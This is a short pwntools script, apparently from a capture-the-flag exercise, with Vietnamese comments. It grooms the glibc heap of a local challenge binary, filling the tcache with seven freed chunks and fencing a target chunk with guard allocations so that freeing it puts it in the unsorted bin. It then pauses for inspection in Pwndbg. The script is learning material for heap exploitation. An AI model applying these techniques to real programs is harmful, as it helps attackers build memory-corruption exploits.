from pwn import *

p = process(['./ld-linux-x86-64.so.2', './chall'], env={"LD_PRELOAD": "./libc.so.6"})
context.log_level = 'debug'
context.terminal = ['cmd.exe', '/c', 'start', 'cmd.exe', '/c', 'wsl.exe']

def add(idx, size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)

def delete(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Index: ", str(idx).encode())

gdb.attach(p, gdbscript='''
continue
''')

# 1. Tạo 7 chunk bự để lấp đầy Tcache Large Bins
for i in range(7):
    add(i, 1024, b"fill\n")

# 2. Tạo RÀO CHẮN 1 (Ngăn chunk mục tiêu gộp với 7 chunk trên)
add(7, 0x18, b"guard1\n")

# 3. Tạo Chunk MỤC TIÊU (Sẽ rơi vào Unsorted Bin)
add(8, 1024, b"target\n")

# 4. Tạo RÀO CHẮN 2 (Ngăn chunk mục tiêu gộp với Top Chunk)
add(9, 0x18, b"guard2\n")

# 5. Giải phóng 7 chunk đầu để lấp kín Tcache
for i in range(7):
    delete(i)

# 6. KÍCH HOẠT! Giải phóng chunk mục tiêu.
# Vì Tcache đã đầy và có rào chắn 2 bên, nó BẮT BUỘC phải vào Unsorted Bin nguyên vẹn!
delete(8)

log.info("XONG! Hãy vào Pwndbg gõ lệnh 'bins'")
p.interactive()